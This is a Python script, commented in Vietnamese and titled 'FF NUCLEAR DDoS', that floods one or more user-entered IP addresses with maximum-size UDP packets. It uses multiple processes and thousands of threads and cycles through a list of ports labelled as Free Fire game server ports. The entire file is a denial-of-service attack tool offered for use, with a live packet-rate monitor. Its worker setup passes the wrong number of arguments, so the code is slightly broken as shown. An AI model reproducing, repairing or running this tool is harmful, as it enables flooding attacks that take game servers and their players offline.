# ============================================
# FF NUCLEAR DDoS - LOGIC MẠNH NHẤT
# KHÔNG FAKE - KHÔNG SPOOF - CHỈ CÓ SỨC MẠNH
# TẬN DỤNG TOÀN BỘ CPU - MULTI-PROCESS
# GỬI LIÊN TỤC KHÔNG NGỪNG - KHÔNG DELAY
# ============================================

import socket
import time
import threading
import os
import random
import sys
import multiprocessing
from datetime import datetime

# ============================================
# CẤU HÌNH TỐI ĐA
# ============================================
BURST_SIZE = 5000           # Gửi 5000 gói 1 lần
PAYLOAD_SIZE = 65507        # Gói UDP max size
SOCKET_POOL = 500           # 500 socket dùng chung
PROCESS_COUNT = multiprocessing.cpu_count() or 4  # Dùng hết CPU
MAX_THREADS_PER_PROCESS = 2000

# ============================================
# TẤT CẢ PORT GAME - TẬP TRUNG PORT CHÍNH
# ============================================
FF_PORTS = [
    # Port game chính - tập trung vào đây
    10000, 10001, 10002, 10003, 10004, 10005,
    10006, 10007, 10008, 10009, 10010,
    10016, 39699, 39801,
    # Battle Royale
    17000, 17001, 17002, 17003, 17004, 17005,
    17500, 17501, 17502, 17503, 17504, 17505,
    18000, 18001, 18002, 18003,
    # Clash Squad  
    19000, 19001, 19002, 19003, 19004,
    19500, 19501, 19502, 19503,
    # Ranked
    20000, 20001, 20002, 20003, 20004, 20005,
    21000, 21001, 21002, 21003, 21004,
    21500, 21501, 21502,
    # Custom
    22000, 22001, 22002,
    23000, 23001, 23002,
    25000, 25001, 25002, 25003,
    27000, 27001, 27002, 27003,
    28000, 28001,
    # Voice
    30000, 30001, 30002,
    35000, 35001,
]

class NuclearWorker:
    """Mỗi process chạy 1 instance này"""
    
    def __init__(self, targets, packets_lock, packets_counter, errors_counter):
        self.targets = targets
        self.packets_lock = packets_lock
        self.packets_counter = packets_counter
        self.errors_counter = errors_counter
        self.running = True
        self.sock_pool = []
        self.pool_lock = threading.Lock()
        self.local_packets = 0
        self.local_errors = 0
    
    def _init_sockets(self):
        """Tạo socket pool riêng cho process này"""
        for _ in range(SOCKET_POOL // PROCESS_COUNT):
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
                s.setsockopt(socket.SOL_SOCKET, socket.SO_SNDBUF, 262144)
                s.setsockopt(socket.SOL_SOCKET, socket.SO_RCVBUF, 262144)
                s.settimeout(0.01)
                self.sock_pool.append(s)
            except:
                pass
    
    def _get_sock(self):
        with self.pool_lock:
            if self.sock_pool:
                s = self.sock_pool.pop(0)
                self.sock_pool.append(s)
                return s
        return None
    
    def _udp_worker(self, tid):
        """UDP Nuclear Worker - GỬI LIÊN TỤC KHÔNG NGỪNG"""
        # Tạo socket riêng cho thread này
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            s.setsockopt(socket.SOL_SOCKET, socket.SO_SNDBUF, 262144)
            s.settimeout(0.01)
        except:
            return
        
        # Payload tối đa
        payload = os.urandom(PAYLOAD_SIZE)
        targets = self.targets
        ports = FF_PORTS
        idx = tid
        local_count = 0
        
        # GỬI LIÊN TỤC - KHÔNG DELAY - KHÔNG KIỂM TRA LỖI NHIỀU
        while self.running:
            try:
                ip = targets[idx % len(targets)]
                port = ports[idx % len(ports)]
                idx += 1
                
                # BURST 5000 GÓI 1 LẦN
                for _ in range(BURST_SIZE):
                    s.sendto(payload, (ip, port))
                    local_count += 1
                
                # Cập nhật counter mỗi 50000 gói
                if local_count >= 50000:
                    with self.packets_lock:
                        self.packets_counter[0] += local_count
                    local_count = 0
                    
            except:
                self.local_errors += 1
                if self.local_errors >= 1000:
                    with self.packets_lock:
                        self.errors_counter[0] += self.local_errors
                    self.local_errors = 0
        
        # Cập nhật lần cuối
        with self.packets_lock:
            self.packets_counter[0] += local_count
            self.errors_counter[0] += self.local_errors
        
        s.close()
    
    def start_threads(self, thread_count):
        """Khởi động tất cả threads trong process này"""
        self._init_sockets()
        threads = []
        
        for i in range(thread_count):
            t = threading.Thread(target=self._udp_worker, args=(i,), daemon=True)
            t.start()
            threads.append(t)
        
        return threads
    
    def stop(self):
        self.running = False
        for s in self.sock_pool:
            try: s.close()
            except: pass


def process_worker(targets, packets_counter, errors_counter, thread_count, process_id):
    """Hàm chạy trong mỗi process"""
    worker = NuclearWorker(targets, packets_counter, errors_counter)
    threads = worker.start_threads(thread_count)
    
    # Giữ process chạy
    try:
        while True:
            time.sleep(1)
    except KeyboardInterrupt:
        pass
    finally:
        worker.stop()


def print_banner():
    os.system('clear' if os.name != 'nt' else 'cls')
    print(f"""
    ╔══════════════════════════════════════════════════╗
    ║  ☢ FF NUCLEAR DDoS - LOGIC MẠNH NHẤT ☢       ║
    ║  MULTI-PROCESS: {PROCESS_COUNT} CPU CORES                 ║
    ║  {PAYLOAD_SIZE}B PAYLOAD | {BURST_SIZE}x BURST                ║
    ║  KHÔNG DELAY - KHÔNG FAKE - CHỈ CÓ SỨC MẠNH   ║
    ╚══════════════════════════════════════════════════╝
    """)

def main():
    print_banner()
    
    # IP
    if len(sys.argv) > 1:
        ip_input = sys.argv[1]
        print(f"  [+] IP: {ip_input}")
    else:
        print("  [+] NHẬP IP MỤC TIÊU:")
        ip_input = input("  >> ").strip()
    
    if not ip_input:
        print("  [-] CHƯA NHẬP IP!")
        return
    
    targets = [t.strip() for t in ip_input.replace(',', ' ').split() if t.strip()]
    
    # Threads
    if len(sys.argv) > 2:
        total_threads = int(sys.argv[2])
    else:
        print(f"\n  [+] TỔNG SỐ THREADS:")
        print(f"      1000-5000: Mạnh")
        print(f"      5000-20000: Rất mạnh")
        print(f"      20000-50000: Siêu mạnh")
        try:
            total_threads = int(input("  >> ").strip() or "5000")
        except:
            total_threads = 5000
    
    total_threads = max(PROCESS_COUNT, min(total_threads, 100000))
    threads_per_process = total_threads // PROCESS_COUNT
    
    print(f"\n  [☢] KHỞI ĐỘNG NUCLEAR DDoS...")
    print(f"  [💻] {PROCESS_COUNT} PROCESSES x {threads_per_process} THREADS = {PROCESS_COUNT * threads_per_process}")
    print(f"  [🎯] {len(targets)} IP | {len(FF_PORTS)} PORTS")
    print(f"  [💣] {PAYLOAD_SIZE}B PAYLOAD | {BURST_SIZE}x BURST")
    print(f"  [⚡] KHÔNG DELAY - KHÔNG FAKE - CHỈ CÓ SỨC MẠNH")
    print(f"\n  CTRL+C = DỪNG\n")
    
    # Shared counters giữa các process
    manager = multiprocessing.Manager()
    packets_counter = manager.list([0])
    errors_counter = manager.list([0])
    
    # Khởi động các process
    processes = []
    for i in range(PROCESS_COUNT):
        p = multiprocessing.Process(
            target=process_worker,
            args=(targets, packets_counter, errors_counter, threads_per_process, i),
            daemon=True
        )
        p.start()
        processes.append(p)
    
    start_time = time.time()
    
    # Monitor
    try:
        last_p = 0
        last_t = time.time()
        
        while True:
            time.sleep(0.5)
            
            p = packets_counter[0]
            e = errors_counter[0]
            now = time.time()
            elapsed = now - start_time
            dt = now - last_t
            dp = p - last_p
            
            pps = dp / dt if dt > 0 else 0
            avg_pps = p / elapsed if elapsed > 0 else 0
            
            last_p = p
            last_t = now
            
            m, s = divmod(int(elapsed), 60)
            h, m = divmod(m, 60)
            
            if h > 0:
                ts = f"{h}h{m:02d}p{s:02d}s"
            else:
                ts = f"{m:02d}p{s:02d}s"
            
            print(f"\r  [☢] GÓI: {p:,} | {pps:,.0f}/s | TB: {avg_pps:,.0f}/s | LỖI: {e} | {ts}  ", end='')
            
    except KeyboardInterrupt:
        print("\n\n  [⏹] ĐANG DỪNG...")
    
    # Dừng tất cả process
    for p in processes:
        p.terminate()
        p.join(timeout=2)
    
    time.sleep(0.5)
    
    p = packets_counter[0]
    e = errors_counter[0]
    elapsed = time.time() - start_time
    avg_pps = p / elapsed if elapsed > 0 else 0
    m, s = divmod(int(elapsed), 60)
    h, m = divmod(m, 60)
    
    if h > 0:
        ts = f"{h}h{m:02d}p{s:02d}s"
    else:
        ts = f"{m:02d}p{s:02d}s"
    
    print(f"""
    ╔══════════════════════════════════════════════════╗
    ║           KẾT THÚC                               ║
    ╠══════════════════════════════════════════════════╣
    ║  TIME:     {ts:>32}  ║
    ║  GÓI:      {p:>32,}  ║
    ║  TỐC ĐỘ TB:{avg_pps:>32,.0f}/s  ║
    ║  LỖI:      {e:>32,}  ║
    ║  PROCESS:  {PROCESS_COUNT:>32}  ║
    ║  THREADS:  {PROCESS_COUNT * threads_per_process:>32,}  ║
    ╚══════════════════════════════════════════════════╝
    """)

if __name__ == '__main__':
    multiprocessing.freeze_support()
    main()
